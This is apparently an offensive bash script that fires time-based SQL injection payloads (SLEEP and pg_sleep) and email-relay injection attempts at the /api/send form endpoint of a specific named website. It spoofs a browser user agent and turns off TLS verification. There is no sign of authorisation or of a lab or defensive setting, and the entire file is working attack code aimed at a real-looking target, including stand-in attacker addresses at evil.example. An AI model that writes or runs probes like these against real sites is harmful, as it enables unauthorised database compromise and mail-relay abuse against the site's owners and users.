#!/bin/bash
# Differential behaviour probe on /api/send (server-side, 500 = it reaches app logic)
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
T='https://www.infinitycapital.bh'
g(){ curl -sk -A "$UA" -m 25 -o /dev/null -w "%{http_code}:%{time_total}" -G --data-urlencode "$1" "$T/api/send"; echo "  [$2]"; }
p(){ curl -sk -A "$UA" -m 25 -X POST -H 'Content-Type: application/json' -d "$1" -o /dev/null -w "%{http_code}:%{time_total}" "$T/api/send"; echo "  [$2]"; }
J='{"fname":"D10","lname":"Probe","telInput":"+97336000000","cname":"d10","msgTxt":"hello d10","check":"1"}'

echo "== baseline"
p "$J" "valid-shape"
echo "== SQRLi time-based probes in msgTxt"
p '{"fname":"D10","msgTxt":"hello'"'"' AND SLEEP(6)-- -","check":"1"}' "SLEEP(6)"
p '{"fname":"D10","msgTxt":"hello'"'"' AND SLEEP(0)-- -","check":"1"}' "SLEEP(0)"
echo "== PG sleep"
p '{"fname":"D10","msgTxt":"x'"'"'; SELECT pg_sleep(6);--","check":"1"}' "pg_sleep(6)"
p '{"fname":"D10","msgTxt":"x'"'"'; SELECT pg_sleep(0);--","check":"1"}' "pg_sleep(0)"
echo "== fname probes"
p '{"fname":"D10'"'"' AND SLEEP(6)-- -","msgTxt":"h","check":"1"}' "fname SLEEP(6)"
p '{"fname":"D10'"'"' AND SLEEP(0)-- -","msgTxt":"h","check":"1"}' "fname SLEEP(0)"
echo "== cname probes"
p '{"cname":"D10'"'"' AND SLEEP(6)-- -","msgTxt":"h","check":"1"}' "cname SLEEP(6)"
echo "== telInput probes"
p '{"telInput":"+97336000000'"'"' AND SLEEP(6)-- -","msgTxt":"h","check":"1"}' "tel SLEEP(6)"
echo "== SMTP-ish (email relay) probes"
p '{"email":"attacker@evil.example","msgTxt":"h","check":"1"}' "email to evil.example"
p '{"to":"attacker@evil.example","msgTxt":"h","check":"1"}' "to field"
p '{"recipient":"attacker@evil.example","msgTxt":"h","check":"1"}' "recipient field"
echo DONE
